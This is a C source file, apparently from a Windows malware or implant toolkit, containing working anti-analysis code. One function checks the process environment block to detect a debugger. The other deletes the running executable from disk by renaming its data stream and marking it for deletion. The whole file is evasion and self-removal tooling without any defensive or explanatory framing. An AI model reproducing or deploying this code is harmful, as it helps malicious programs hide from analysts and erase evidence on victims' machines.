#include <stdio.h>
#include <Windows.h>
#include "structs.h"
#include "antianalysis.h"
#include "stringutils.h"
#include "memoryutils.h"


BOOL IsBeingDebugged() {
#ifdef _WIN64
	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif
	if (pPeb->BeingDebugged == 1)
		return TRUE;
	return FALSE;
}


BOOL DeleteSelf() {
		BOOL	bResult				 = FALSE;		
		HANDLE	hFile				 = INVALID_HANDLE_VALUE;
		WCHAR	szPath[MAX_PATH * 2] = { 0 };

	// Create the stream name 
	WCHAR streamName[32] = { 0 };
	_wcscpy_s(streamName, ARRAYSIZE(streamName), L":to_be_deleted");

	// Prepare FILE_RENAME_INFO
	SIZE_T streamLen = _wcslen(streamName) * sizeof(WCHAR);
	SIZE_T renameSize = sizeof(FILE_RENAME_INFO) + streamLen;
	PFILE_RENAME_INFO pRenameInfo = (PFILE_RENAME_INFO)_heapalloc(renameSize);
	if (!pRenameInfo)
		return FALSE;

	pRenameInfo->FileNameLength = (DWORD)streamLen;
	_memcpy(pRenameInfo->FileName, streamName, streamLen);

	// Prepare FILE_DISPOSITION_INFO
	FILE_DISPOSITION_INFO dispInfo = { .DeleteFile = TRUE };

	// Get path to current module 
	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
		goto _CLEANUP;
	}

	// Rename file to random stream 
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		goto _CLEANUP;

	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRenameInfo, (DWORD)renameSize))
		goto _CLEANUP;

	CloseHandle(hFile);
	hFile = INVALID_HANDLE_VALUE;

	// Mark file for deletion 
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		goto _CLEANUP;

	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &dispInfo, sizeof(dispInfo)))
		goto _CLEANUP;

	bResult = TRUE;

_CLEANUP:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pRenameInfo)
		_heapfree(pRenameInfo);
	return bResult;
}
